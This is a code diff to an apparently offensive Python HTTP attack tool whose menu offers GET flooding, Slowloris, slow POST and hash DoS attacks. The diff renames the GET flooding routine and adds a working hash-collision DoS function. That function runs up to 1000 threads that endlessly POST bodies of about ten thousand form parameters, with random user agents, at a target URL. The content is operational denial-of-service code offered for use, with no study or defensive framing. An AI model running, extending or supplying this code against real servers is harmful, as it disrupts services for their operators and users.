@@ -1,6 +1,7 @@
 import sys, time, random, requests
 
 from ..thread import ThreadWorker, ThreadCounter2
+from ..utils import get_random_string
 from .slowdos import SlowHTTPDos
 from .utils import get_random_user_agent
 
@@ -18,7 +19,7 @@ class NF_HTTPTool:
  |                       < HTTP Attack Menu >                        |
  +-------------------------------------------------------------------+
  |                                                                   |
- |   (1) HTTP DoS (GET Flooding)                                     |
+ |   (1) HTTP GET Flooding                                           |
  |                                                                   |
  |   (2) Slow HTTP Header DoS (aka. Slowloris)                       |
  |   (3) Slow HTTP POST DoS                                          |
@@ -55,7 +56,7 @@ class NF_HTTPTool:
             if thread_count <= 0: thread_count = 1
         
             if i == '1':
-                self.http_dos(url, thread_count)
+                self.get_flooding(url, thread_count)
                 sys.exit() # TODO
             elif i == '2':
                 slow = SlowHTTPDos()
@@ -66,7 +67,8 @@ class NF_HTTPTool:
                 slow.slow_http_post_dos(url, thread_count)
                 sys.exit() # TODO
             elif i == '4':
-                print('TODO')
+                self.hash_dos(url, thread_count)
+                sys.exit()
             else:
                 continue
 
@@ -77,8 +79,7 @@ class NF_HTTPTool:
             print_menu()
 
 
-
-    def http_dos(self, url: str, thread_count: int) -> None:
+    def get_flooding(self, url: str, thread_count: int) -> None:
         if not url.startswith(('http://', 'https://')):
             url = 'http://' + url
 
@@ -102,6 +103,48 @@ class NF_HTTPTool:
         tw = ThreadWorker(thread_count)
         tw.set_main_thread(main)
         tw.set_worker_thread(worker, (url,))
-        print('[*] Start Layer 7 HTTP DoS!\n')
+        print('[*] Start HTTP GET Flooding DoS!\n')
+        tw.run()
+        print('[+] GET Flooding has been stopped.')
+
+
+    def hash_dos(self, url: str, thread_count: int) -> None:
+        if thread_count >= 1000:
+            print('[*] Too many threads. Reduce to 1000.')
+            thread_count = 1000
+
+        if not url.startswith(('http://', 'https://')):
+            url = 'http://' + url
+
+        def main():
+            print('[*] Sending...')
+            time.sleep(1)
+
+        def worker(url: str):
+            time.sleep(3)
+            headers = {
+                'User-Agent': get_random_user_agent(),
+                'Content-Type': 'application/x-www-form-urlencoded',
+            }
+            while True:
+                try:
+                    base = get_random_string(16)
+                    body = ''
+                    for i in range(10000):
+                        body += f'{base}{i}={i}{base}&'
+                    body += f'{base}={base}'
+                    requests.post(url, headers=headers, data=body, timeout=10)
+                except:
+                    pass
+                time.sleep(random.random() * 2)
+
+        counter = ThreadCounter2(['Succ', 'Error'])
+        tw = ThreadWorker(thread_count)
+        tw.set_main_thread(main)
+        tw.set_worker_thread(worker, (url,))
+        print('[*] Start Hash DoS!\n')
         tw.run()
         print('[+] DoS attack has been stopped.')
+
+
+
